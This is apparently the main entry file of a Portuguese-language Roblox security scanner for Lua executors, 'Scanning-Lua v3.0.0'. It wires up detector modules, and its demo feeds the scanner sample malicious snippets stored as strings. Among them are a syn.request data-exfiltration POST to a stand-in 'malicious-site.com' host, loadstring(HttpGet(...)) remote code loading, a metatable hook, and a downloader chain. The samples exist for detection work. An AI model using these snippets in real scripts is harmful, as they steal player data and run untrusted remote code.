--[[
    ╔══════════════════════════════════════════════════════════════╗
    ║                    Scanning-Lua v3.0.0                      ║
    ║       Scanner de Segurança Avançado para Roblox             ║
    ║                                                              ║
    ║  Detecta vulnerabilidades, monitora comportamento runtime,  ║
    ║  analisa scripts com heurística avançada, deobfuscação,     ║
    ║  sistema de assinaturas, correlação e monitoramento          ║
    ║  contínuo. Logs salvos em JSON para análise posterior.       ║
    ║                                                              ║
    ║  Compatível com Wave Executor e outros executors Lua.       ║
    ╚══════════════════════════════════════════════════════════════╝
]]

-- ============================================================
-- Carregar módulos base
-- ============================================================
local Config = require("config")
local JSON = require("modules.json")
local Logger = require("modules.logger")
local Filters = require("modules.filters")
local Scanner = require("modules.scanner")
local VulnerabilityDetector = require("modules.vulnerability_detector")
local NetworkMonitor = require("modules.network_monitor")

-- Carregar módulos avançados (#11-#26)
local BehaviorAnalyzer = require("modules.behavior_analyzer")
local Deobfuscator = require("modules.deobfuscator")
local SignatureSystem = require("modules.signature_system")
local HeuristicEngine = require("modules.heuristic_engine")
local IncrementalScanner = require("modules.incremental_scanner")
local ThreadController = require("modules.thread_controller")
local HookDetector = require("modules.hook_detector")
local IntegrityGuard = require("modules.integrity_guard")
local StealthMode = require("modules.stealth_mode")
local DebugSystem = require("modules.debug_system")
local Dashboard = require("modules.dashboard")
local ScriptCorrelator = require("modules.script_correlator")
local ContinuousMonitor = require("modules.continuous_monitor")
local PayloadDetector = require("modules.payload_detector")
local FalsePositiveReducer = require("modules.false_positive_reducer")
local ScannerGui = require("modules.gui")

-- ============================================================
-- Inicialização
-- ============================================================
print("============================================")
print("  Scanning-Lua v" .. Config.VERSION)
print("  Scanner de Segurança Avançado para Roblox")
print("============================================")
print("")

-- Criar diretórios de saída (compatível com ambientes que suportam io)
pcall(function()
    os.execute("mkdir -p " .. Config.LOG_DIR)
    os.execute("mkdir -p " .. Config.REPORT_DIR)
end)

-- Inicializar Logger
local logger = Logger.new(Config.Logger, Config.LOG_DIR)
logger:info("MAIN", "Scanning-Lua inicializado", {
    version = Config.VERSION,
    session_id = logger.sessionId,
})

-- Inicializar Debug System (#20)
local debugSystem = DebugSystem.new(Config.Debug, logger)
debugSystem:logEvent("MAIN", "INIT", { version = Config.VERSION })

-- Inicializar Stealth Mode (#19) - deve ser antes de outros módulos
local stealthMode = StealthMode.new(Config.Stealth, logger)
if Config.Stealth.ENABLED then
    stealthMode:enable()
end

-- Inicializar Filtros
local filters = Filters.new(Config.Filters, logger)
logger:info("MAIN", "Módulo de filtros carregado", {
    patterns_count = #(Config.Filters.SUSPICIOUS_PATTERNS or {}),
    min_severity = Config.Filters.MIN_SEVERITY,
})

-- Inicializar Scanner
local scanner = Scanner.new(Config.Scanner, logger, filters)
logger:info("MAIN", "Scanner inicializado", {
    auto_scan = Config.Scanner.AUTO_SCAN_ENABLED,
    scan_interval = Config.Scanner.AUTO_SCAN_INTERVAL,
})

-- Inicializar Detector de Vulnerabilidades
local vulnDetector = VulnerabilityDetector.new(Config.Vulnerability, logger)
logger:info("MAIN", "Detector de vulnerabilidades carregado")

-- Inicializar Monitor de Rede
local networkMonitor = NetworkMonitor.new(Config.Network, logger)
logger:info("MAIN", "Monitor de rede inicializado")

-- Inicializar módulos avançados
local behaviorAnalyzer = BehaviorAnalyzer.new(Config.Behavior, logger)
local deobfuscator = Deobfuscator.new(logger)
local signatureSystem = SignatureSystem.new(Config.Signatures, logger)
local heuristicEngine = HeuristicEngine.new(Config.Heuristic, logger)
local incrementalScanner = IncrementalScanner.new(logger)
local threadController = ThreadController.new(Config.ThreadControl, logger)
local hookDetector = HookDetector.new(logger)
local integrityGuard = IntegrityGuard.new(logger)
local dashboard = Dashboard.new({}, logger)
local scriptCorrelator = ScriptCorrelator.new(logger)
local continuousMonitor = ContinuousMonitor.new(Config.ContinuousMonitor, logger)
local payloadDetector = PayloadDetector.new({}, logger)
local falsePositiveReducer = FalsePositiveReducer.new(Config.FalsePositive, logger)
local scannerGui = ScannerGui.new(Config.GUI, logger)

logger:info("MAIN", "Todos os módulos avançados carregados", {
    signatures_count = signatureSystem:getSignatureCount(),
    stealth_enabled = Config.Stealth.ENABLED,
    incremental_enabled = Config.Incremental.ENABLED,
})

-- Capturar baseline de hooks (#17) e registrar integridade (#18)
hookDetector:captureBaseline()
integrityGuard:registerModule("scanner", scanner)
integrityGuard:registerModule("vulnDetector", vulnDetector)
integrityGuard:registerModule("networkMonitor", networkMonitor)

-- ============================================================
-- ScanningLua API - Interface principal
-- ============================================================
local ScanningLua = {}

--- Executa um scan completo do jogo
--- @param gameInstance table|nil Objeto game do Roblox (usa global 'game' se nil)
--- @return table Resultados do scan
function ScanningLua.fullScan(gameInstance)
    local target = gameInstance or (type(game) == "userdata" and game) or nil

    logger:info("MAIN", "========== SCAN COMPLETO v3.0 INICIADO ==========")
    debugSystem:startTimer("full_scan")

    -- 1. Verificar integridade dos módulos (#18)
    logger:info("MAIN", "[1/8] Verificando integridade dos módulos...")
    integrityGuard:checkIntegrity()

    -- 2. Verificar hooks maliciosos (#17)
    logger:info("MAIN", "[2/8] Verificando hooks maliciosos...")
    hookDetector:checkForHooks()

    -- 3. Instalar hooks de rede
    logger:info("MAIN", "[3/8] Instalando monitor de rede...")
    networkMonitor:installHooks()

    -- 4. Iniciar monitoramento de comportamento (#11)
    logger:info("MAIN", "[4/8] Iniciando análise de comportamento runtime...")
    behaviorAnalyzer:startMonitoring()

    -- 5. Escanear serviços do jogo (com incremental caching #15)
    if target then
        logger:info("MAIN", "[5/8] Escaneando serviços do jogo...")
        scanner:scanServices(target)
    else
        logger:warn("MAIN", "[5/8] Objeto 'game' não disponível - scan de serviços ignorado")
    end

    -- 6. Analisar vulnerabilidades nos resultados
    logger:info("MAIN", "[6/8] Analisando vulnerabilidades...")
    vulnDetector:analyzeScanResults(scanner:getResults())

    -- 7. Analisar tráfego de rede
    logger:info("MAIN", "[7/8] Analisando tráfego de rede...")
    local networkAlerts = networkMonitor:analyzeTraffic()

    -- 8. Correlacionar scripts (#23)
    logger:info("MAIN", "[8/8] Correlacionando scripts...")
    local correlations = scriptCorrelator:analyzeCorrelations()

    -- Parar monitoramento de comportamento
    behaviorAnalyzer:stopMonitoring()

    -- Performance timer
    local scanTime = debugSystem:stopTimer("full_scan")

    -- Resumo completo
    local summary = ScanningLua.getStats()
    summary.scan_time_seconds = scanTime
    summary.correlations = #correlations
    summary.network_alerts = #networkAlerts

    logger:info("MAIN", "========== SCAN COMPLETO FINALIZADO ==========", summary)

    -- Exibir dashboard (#21)
    dashboard:displayConsole(summary)

    -- Atualizar GUI (#27) e exibir se auto_show estiver habilitado
    pcall(function()
        scannerGui:update(summary)
        if Config.GUI.AUTO_SHOW then
            scannerGui:show()
        end
    end)

    -- Salvar resultados automaticamente
    ScanningLua.saveAllResults()

    return summary
end

--- Escaneia código Lua diretamente (sem precisar do ambiente Roblox)
--- Agora com análise avançada: deobfuscação, assinaturas, heurística, comportamento, payloads
--- @param code string Código Lua a ser analisado
--- @param sourceName string Nome/identificador da origem
--- @return table Resultados da análise
function ScanningLua.scanCode(code, sourceName)
    sourceName = sourceName or "direct_input"
    debugSystem:startTimer("scan_code:" .. sourceName)

    logger:info("MAIN", string.format("Analisando código: %s (%d caracteres)", sourceName, #code))

    -- Verificar cache incremental (#15)
    if Config.Incremental.ENABLED then
        local needsRescan, cachedResults = incrementalScanner:needsRescan(sourceName, code)
        if not needsRescan and cachedResults then
            logger:info("MAIN", string.format("Cache hit para %s - usando resultados anteriores", sourceName))
            debugSystem:stopTimer("scan_code:" .. sourceName)
            return cachedResults
        end
    end

    -- 1. Deobfuscação básica (#12)
    local deobfuscatedCode, deobTransformations = deobfuscator:deobfuscate(code, sourceName)

    -- 2. Analisar com filtros
    local filterMatches = filters:analyzeCode(deobfuscatedCode, sourceName)

    -- 3. Detectar vulnerabilidades
    local vulnerabilities = vulnDetector:analyzeFilterResults(filterMatches, sourceName)

    -- 4. Scan de assinaturas (#13)
    local signatureDetections = signatureSystem:scan(deobfuscatedCode, sourceName)

    -- 5. Análise heurística (#14 + #22)
    local heuristicResult = heuristicEngine:analyze(deobfuscatedCode, sourceName)

    -- 6. Análise de comportamento estático (#11)
    local behaviorDetections = behaviorAnalyzer:analyzeCodeBehavior(deobfuscatedCode, sourceName)

    -- 7. Detecção de payloads remotos (#25)
    local payloadDetections = payloadDetector:scan(deobfuscatedCode, sourceName)

    -- 8. Detecção de hooks maliciosos (#17) - análise estática
    local hookPatterns = hookDetector:analyzeCode(deobfuscatedCode, sourceName)

    -- 9. Profiling para correlação (#23)
    scriptCorrelator:profileScript(deobfuscatedCode, sourceName)

    -- 10. Redução de falsos positivos (#26)
    local allAlerts = {}
    for _, v in ipairs(vulnerabilities) do
        allAlerts[#allAlerts + 1] = {
            source = sourceName,
            score = heuristicResult.score,
            severity = v.severity,
            code = deobfuscatedCode,
            pattern = v.pattern,
            data = v,
        }
    end

    local passedAlerts, suppressedAlerts = falsePositiveReducer:filterAlerts(allAlerts)

    local result = {
        source = sourceName,
        code_length = #code,
        -- Análise base
        filter_matches = filterMatches,
        match_count = #filterMatches,
        vulnerabilities = vulnerabilities,
        vulnerability_count = #vulnerabilities,
        -- Análise avançada
        deobfuscation = {
            transformations = deobTransformations,
            was_obfuscated = #deobTransformations > 0,
        },
        signatures = {
            detections = signatureDetections,
            count = #signatureDetections,
        },
        heuristic = heuristicResult,
        behavior = {
            detections = behaviorDetections,
            count = #behaviorDetections,
        },
        payloads = {
            detections = payloadDetections,
            count = #payloadDetections,
        },
        hooks = {
            patterns = hookPatterns,
            count = #hookPatterns,
        },
        false_positive = {
            alerts_passed = #passedAlerts,
            alerts_suppressed = #suppressedAlerts,
        },
    }

    -- Atualizar cache incremental (#15)
    if Config.Incremental.ENABLED then
        incrementalScanner:updateCache(sourceName, code, result)
    end

    debugSystem:stopTimer("scan_code:" .. sourceName)
    debugSystem:logEvent("SCAN", "CODE_ANALYZED", {
        source = sourceName,
        score = heuristicResult.score,
        level = heuristicResult.level,
        signatures = #signatureDetections,
        vulnerabilities = #vulnerabilities,
    })

    logger:info("MAIN", string.format(
        "Análise concluída: %d padrões, %d vulns, %d assinaturas, score %d (%s)",
        #filterMatches, #vulnerabilities, #signatureDetections,
        heuristicResult.score, heuristicResult.level
    ), result)

    return result
end

--- Monitora uma requisição HTTP
--- @param method string Método HTTP
--- @param url string URL
--- @param headers table|nil Headers
--- @param body string|nil Corpo
--- @return table Entrada de log
function ScanningLua.logHTTPRequest(method, url, headers, body)
    return networkMonitor:logRequest(method, url, headers, body)
end

--- Salva todos os resultados e relatórios
function ScanningLua.saveAllResults()
    local timestamp = os.date("!%Y%m%d_%H%M%S")

    -- Salvar logs
    logger:flush(string.format("%s/scan_log_%s.json", Config.LOG_DIR, timestamp))

    -- Salvar resultados do scanner
    scanner:saveResults(string.format("%s/scan_results_%s.json", Config.REPORT_DIR, timestamp))

    -- Salvar relatório de vulnerabilidades
    vulnDetector:saveReport(string.format("%s/vulnerability_report_%s.json", Config.REPORT_DIR, timestamp))

    -- Salvar dados de rede
    local networkData = networkMonitor:exportJSON()
    local networkFile = io.open(string.format("%s/network_report_%s.json", Config.REPORT_DIR, timestamp), "w")
    if networkFile then
        networkFile:write(networkData)
        networkFile:close()
    end

    logger:info("MAIN", "Todos os resultados salvos com sucesso")
end

--- Retorna relatório de vulnerabilidades
--- @return table Relatório formatado
function ScanningLua.getVulnerabilityReport()
    return vulnDetector:generateReport()
end

--- Retorna estatísticas gerais (incluindo todos os módulos avançados)
--- Inclui dados detalhados (listas) para a GUI poder exibir resultados individuais
--- @return table Estatísticas
function ScanningLua.getStats()
    -- Vulnerabilidades: incluir lista detalhada para aba Vulns da GUI
    local vulnStats = vulnDetector:getStats()
    vulnStats.details = vulnDetector:getVulnerabilities()

    -- Heurística: incluir lista de análises para aba Heuristic da GUI
    local heuristicStats = heuristicEngine:getStats()
    heuristicStats.analyses = heuristicEngine:getAnalyses()

    -- Assinaturas: incluir lista de detecções para aba Signatures da GUI
    local sigStats = signatureSystem:getStats()
    sigStats.detections = signatureSystem:getDetections()

    -- Rede: incluir lista de requisições para aba Network da GUI
    local netStats = networkMonitor:getStats()
    netStats.requests = networkMonitor:getRequestLog()

    return {
        scanner = scanner:getSummary(),
        vulnerabilities = vulnStats,
        network = netStats,
        filters = filters:getStats(),
        logger = logger:getStats(),
        -- Módulos avançados
        behavior = behaviorAnalyzer:getStats(),
        heuristic = heuristicStats,
        signatures = sigStats,
        incremental = incrementalScanner:getStats(),
        performance = debugSystem:getStats(),
        false_positive = falsePositiveReducer:getStats(),
        correlator = scriptCorrelator:getStats(),
        continuous = continuousMonitor:getStats(),
    }
end

--- Reseta todos os módulos
function ScanningLua.reset()
    scanner:reset()
    vulnDetector:reset()
    networkMonitor:reset()
    filters:reset()
    -- Reset módulos avançados
    behaviorAnalyzer:reset()
    heuristicEngine:reset()
    signatureSystem:reset()
    incrementalScanner:reset()
    scriptCorrelator:reset()
    payloadDetector:reset()
    falsePositiveReducer:reset()
    debugSystem:reset()
    logger:info("MAIN", "Todos os módulos resetados")
end

--- Finaliza o scanner e salva dados pendentes
function ScanningLua.shutdown()
    logger:info("MAIN", "Encerrando Scanning-Lua...")

    -- Parar módulos contínuos
    behaviorAnalyzer:stopMonitoring()
    continuousMonitor:stop()
    integrityGuard:deactivate()

    -- Desativar stealth mode
    if stealthMode:isEnabled() then
        stealthMode:flushOutput()
        stealthMode:disable()
    end

    -- Imprimir performance
    debugSystem:printPerformanceSummary()

    ScanningLua.saveAllResults()
    logger:close()
    print("[Scanning-Lua] Encerrado com sucesso.")
end

-- ============================================================
-- Modo de demonstração (quando executado fora do Roblox)
-- ============================================================

--- Executa uma demonstração do scanner com dados simulados
function ScanningLua.runDemo()
    print("")
    print("============================================")
    print("  MODO DEMONSTRAÇÃO v3.0.0 ADVANCED")
    print("  Executando com dados simulados")
    print("============================================")
    print("")

    logger:info("DEMO", "Iniciando demonstração do scanner avançado")
    debugSystem:startTimer("demo_total")

    -- Simular análise de código com padrões suspeitos
    local sampleCode1 = [[
        local HttpService = game:GetService("HttpService")
        local data = HttpService:JSONEncode({username = player.Name, coins = 999999})
        local response = syn.request({
            Url = "http://malicious-site.com/steal",
            Method = "POST",
            Body = data
        })
    ]]

    local sampleCode2 = [[
        local mt = getrawmetatable(game)
        local oldNamecall = mt.__namecall
        setrawmetatable(game, {
            __namecall = newcclosure(function(self, ...)
                local method = getnamecallmethod()
                if method == "FireServer" then
                    print("Intercepted:", self.Name)
                end
                return oldNamecall(self, ...)
            end)
        })
    ]]

    local sampleCode3 = [[
        loadstring(game:HttpGet("https://raw.githubusercontent.com/user/repo/main/script.lua"))()
        local env = getgenv()
        env.someGlobal = true
    ]]

    local sampleCodeSafe = [[
        --- PlayerHandler Module
        --- Handles player loading and character management
        --- @module PlayerHandler
        local Players = game:GetService("Players")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")

        local PlayerHandler = {}
        PlayerHandler.__index = PlayerHandler

        --- Creates a new PlayerHandler instance
        function PlayerHandler.new()
            local self = setmetatable({}, PlayerHandler)
            self.players = {}
            return self
        end

        --- Handles a player joining the game
        function PlayerHandler:onPlayerAdded(player)
            self.players[player.UserId] = {
                name = player.Name,
                joinTime = os.time(),
            }
            print("Player loaded:", player.Name)
        end

        --- Handles a player leaving the game
        function PlayerHandler:onPlayerRemoving(player)
            self.players[player.UserId] = nil
        end

        return PlayerHandler
    ]]

    -- Código com ofuscação simulada
    local sampleCodeObfuscated = [[
        local _0x1 = string.char(108,111,97,100,115,116,114,105,110,103)
        local _0x2 = "aHR0cHM6Ly9leGFtcGxlLmNvbS9zY3JpcHQubHVh"
        local _0x3 = "ab" .. "cd" .. "ef" .. "gh"
        local _a1 = 42 + 13 * 7
        local _a2 = 99 - 33 + 1
        local _a3 = 100 * 2 + 50
    ]]

    -- Código com cadeia downloader → executor
    local sampleCodeChain1 = [[
        local data = game:HttpGet("https://example.com/payload.lua")
        _G.downloadedPayload = data
        shared.payloadReady = true
    ]]

    local sampleCodeChain2 = [[
        repeat task.wait(0.1) until shared.payloadReady
        local payload = _G.downloadedPayload
        loadstring(payload)()
    ]]

    -- Executar análise
    print("\n--- Analisando Amostra 1: Exfiltração de dados ---")
    local result1 = ScanningLua.scanCode(sampleCode1, "sample_data_exfiltration.lua")

    print("\n--- Analisando Amostra 2: Manipulação de metatable ---")
    local result2 = ScanningLua.scanCode(sampleCode2, "sample_metatable_hook.lua")

    print("\n--- Analisando Amostra 3: Injeção de código ---")
    local result3 = ScanningLua.scanCode(sampleCode3, "sample_code_injection.lua")

    print("\n--- Analisando Amostra 4: Código seguro (bem documentado) ---")
    local result4 = ScanningLua.scanCode(sampleCodeSafe, "sample_safe_code.lua")

    print("\n--- Analisando Amostra 5: Código ofuscado ---")
    local result5 = ScanningLua.scanCode(sampleCodeObfuscated, "sample_obfuscated.lua")

    print("\n--- Analisando Amostra 6: Cadeia downloader (parte 1) ---")
    local result6 = ScanningLua.scanCode(sampleCodeChain1, "chain_downloader.lua")

    print("\n--- Analisando Amostra 7: Cadeia executor (parte 2) ---")
    local result7 = ScanningLua.scanCode(sampleCodeChain2, "chain_executor.lua")

    -- Executar correlação entre scripts (#23)
    print("\n--- Correlacionando scripts ---")
    local correlations = scriptCorrelator:analyzeCorrelations()
    if #correlations > 0 then
        print(string.format("  ⚠️  %d correlações detectadas entre scripts!", #correlations))
        for _, corr in ipairs(correlations) do
            print(string.format("    • [%s] %s ↔ %s: %s",
                corr.severity, corr.script_a, corr.script_b, corr.type))
        end
    end

    -- Demonstrar scanner incremental (#15)
    print("\n--- Demonstrando scanner incremental ---")
    print("  Re-escaneando amostra 1 (deve usar cache)...")
    local result1b = ScanningLua.scanCode(sampleCode1, "sample_data_exfiltration.lua")
    print(string.format("  Cache hit rate: %d%%", incrementalScanner:getCacheHitRate()))

    -- Simular requisições HTTP
    print("\n--- Simulando requisições HTTP ---")
    ScanningLua.logHTTPRequest("GET", "https://api.roblox.com/users/1", nil, nil)
    ScanningLua.logHTTPRequest("POST", "https://malicious-site.com/steal", nil, '{"data":"stolen"}')
    ScanningLua.logHTTPRequest("GET", "https://pastebin.com/raw/abc123", nil, nil)
    ScanningLua.logHTTPRequest("GET", "https://www.roblox.com/catalog", nil, nil)

    -- Simular scan de instâncias Roblox (mock)
    print("\n--- Simulando scan de instâncias ---")
    local mockGame = {
        Name = "Game",
        ClassName = "DataModel",
        GetFullName = function() return "Game" end,
        GetChildren = function()
            return {
                {
                    Name = "ReplicatedStorage",
                    ClassName = "ReplicatedStorage",
                    GetFullName = function() return "Game.ReplicatedStorage" end,
                    GetChildren = function()
                        return {
                            {
                                Name = "RemoteEvent",
                                ClassName = "RemoteEvent",
                                Parent = { Name = "ReplicatedStorage" },
                                GetFullName = function() return "Game.ReplicatedStorage.RemoteEvent" end,
                                GetChildren = function() return {} end,
                            },
                            {
                                Name = "FireServerHandler",
                                ClassName = "RemoteEvent",
                                Parent = { Name = "ReplicatedStorage" },
                                GetFullName = function() return "Game.ReplicatedStorage.FireServerHandler" end,
                                GetChildren = function() return {} end,
                            },
                            {
                                Name = "DataSync",
                                ClassName = "RemoteFunction",
                                Parent = { Name = "ReplicatedStorage" },
                                GetFullName = function() return "Game.ReplicatedStorage.DataSync" end,
                                GetChildren = function() return {} end,
                            },
                        }
                    end,
                },
                {
                    Name = "Workspace",
                    ClassName = "Workspace",
                    GetFullName = function() return "Game.Workspace" end,
                    GetChildren = function()
                        return {
                            {
                                Name = "GameScript",
                                ClassName = "Script",
                                Source = sampleCode1,
                                Enabled = true,
                                GetFullName = function() return "Game.Workspace.GameScript" end,
                                GetChildren = function() return {} end,
                            },
                        }
                    end,
                },
            }
        end,
    }

    scanner:scanInstance(mockGame, 0)

    -- Analisar vulnerabilidades
    vulnDetector:analyzeScanResults(scanner:getResults())

    -- Verificar integridade (#18)
    print("\n--- Verificação de integridade ---")
    local integrityReport = integrityGuard:checkIntegrity()
    print(string.format("  Integridade: %s", integrityReport.is_compromised and "COMPROMETIDA ⚠️" or "OK ✅"))

    -- Verificar hooks (#17)
    print("\n--- Verificação de hooks ---")
    local hooks = hookDetector:checkForHooks()
    print(string.format("  Hooks detectados: %d", #hooks))

    -- Demo timer
    local demoTime = debugSystem:stopTimer("demo_total")

    -- Exibir dashboard completo (#21)
    print("\n")
    local stats = ScanningLua.getStats()
    dashboard:displayConsole(stats)

    -- Exibir resultados heurísticos
    print("\n--- Resultados Heurísticos ---")
    local analyses = heuristicEngine:getAnalyses()
    for _, analysis in ipairs(analyses) do
        print(string.format("  %s %s: score=%d (%s)",
            analysis.color, analysis.source, analysis.score, analysis.level))
    end

    -- Exibir detecções de assinatura
    local sigDets = signatureSystem:getDetections()
    if #sigDets > 0 then
        print("\n--- Detecções de Assinatura ---")
        for _, det in ipairs(sigDets) do
            print(string.format("  🧩 [%s] %s em %s (linha %d)",
                det.signature_id, det.signature_name, det.source, det.line_number))
        end
    end

    -- Performance summary
    print("\n--- Performance ---")
    print(string.format("  Tempo total demo: %.3fs", demoTime or 0))
    debugSystem:printPerformanceSummary()

    -- Salvar resultados
    ScanningLua.saveAllResults()

    -- Atualizar GUI (#27) e exibir se auto_show estiver habilitado
    pcall(function()
        scannerGui:update(stats)
        if Config.GUI.AUTO_SHOW then
            scannerGui:show()
        end
    end)

    print("\n============================================")
    print("  DEMONSTRAÇÃO v3.0.0 CONCLUÍDA")
    print("  Verifique os diretórios 'logs/' e 'reports/'")
    print("============================================")

    return stats
end

-- ============================================================
-- API avançada - Módulos #11-#26
-- ============================================================

--- Inicia monitoramento contínuo (#24)
--- @param callback function|nil Callback para scripts novos
function ScanningLua.startContinuousMonitoring(callback)
    continuousMonitor:start(callback or function(scriptInstance, path)
        -- Auto-scan de novos scripts
        pcall(function()
            if scriptInstance.Source then
                ScanningLua.scanCode(scriptInstance.Source, path)
            end
        end)
    end)
end

--- Para monitoramento contínuo
function ScanningLua.stopContinuousMonitoring()
    continuousMonitor:stop()
end

--- Ativa modo stealth (#19)
function ScanningLua.enableStealth()
    stealthMode:enable()
end

--- Desativa modo stealth
function ScanningLua.disableStealth()
    stealthMode:flushOutput()
    stealthMode:disable()
end

--- Ativa modo verbose de debug (#20)
--- @param enabled boolean
function ScanningLua.setVerbose(enabled)
    debugSystem:setVerbose(enabled)
end

--- Retorna dashboard formatado (#21)
--- @return table Embed para Discord webhook
function ScanningLua.getDashboardEmbed()
    return dashboard:generateWebhookEmbed(ScanningLua.getStats())
end

--- Exibe dashboard no console (#21)
function ScanningLua.showDashboard()
    dashboard:displayConsole(ScanningLua.getStats())
end

--- Adiciona script à whitelist (#26)
--- @param scriptPath string
function ScanningLua.whitelistScript(scriptPath)
    falsePositiveReducer:whitelistScript(scriptPath)
end

--- Adiciona assinatura customizada (#13)
--- @param signature table { name, pattern, severity, description }
function ScanningLua.addSignature(signature)
    signatureSystem:addSignature(signature)
end

--- Retorna relatório de correlação entre scripts (#23)
--- @return table
function ScanningLua.getCorrelationReport()
    return scriptCorrelator:getCorrelations()
end

--- Retorna detecções de assinatura (#13)
--- @return table
function ScanningLua.getSignatureDetections()
    return signatureSystem:getDetections()
end

--- Retorna análises heurísticas (#14 + #22)
--- @return table
function ScanningLua.getHeuristicAnalyses()
    return heuristicEngine:getAnalyses()
end

--- Replay de eventos de debug (#20)
--- @param filter table|nil Filtro { category, type, from_time, to_time }
--- @return table Eventos filtrados
function ScanningLua.replayEvents(filter)
    return debugSystem:replayEvents(filter)
end

--- Verificação manual de integridade (#18)
--- @return table Relatório de integridade
function ScanningLua.checkIntegrity()
    return integrityGuard:checkIntegrity()
end

--- Recuperação automática de módulos comprometidos (#18)
--- @return table Relatório de recuperação
function ScanningLua.autoRecover()
    return integrityGuard:autoRecover()
end

-- ============================================================
-- API do GUI (#27)
-- ============================================================

--- Mostra a GUI interativa com os resultados
function ScanningLua.showGui()
    pcall(function()
        scannerGui:show()
        if ScanningLua.lastStats then
            scannerGui:update(ScanningLua.lastStats)
        else
            scannerGui:update(ScanningLua.getStats())
        end
    end)
end

--- Esconde a GUI
function ScanningLua.hideGui()
    pcall(function()
        scannerGui:hide()
    end)
end

--- Toggle da GUI (mostra/esconde)
function ScanningLua.toggleGui()
    pcall(function()
        scannerGui:toggle()
        if scannerGui.isVisible then
            scannerGui:update(ScanningLua.getStats())
        end
    end)
end

--- Atualiza os dados mostrados na GUI
function ScanningLua.refreshGui()
    pcall(function()
        scannerGui:update(ScanningLua.getStats())
    end)
end

--- Destrói a GUI completamente
function ScanningLua.destroyGui()
    pcall(function()
        scannerGui:destroy()
    end)
end

-- ============================================================
-- Auto-executar demonstração se não estiver no Roblox
-- ============================================================
local isRoblox = pcall(function() return game:GetService("Players") end)

if not isRoblox then
    -- Executar demo quando fora do Roblox
    ScanningLua.runDemo()
else
    -- No Roblox: executar scan completo
    ScanningLua.fullScan()
end

-- Exportar API
return ScanningLua
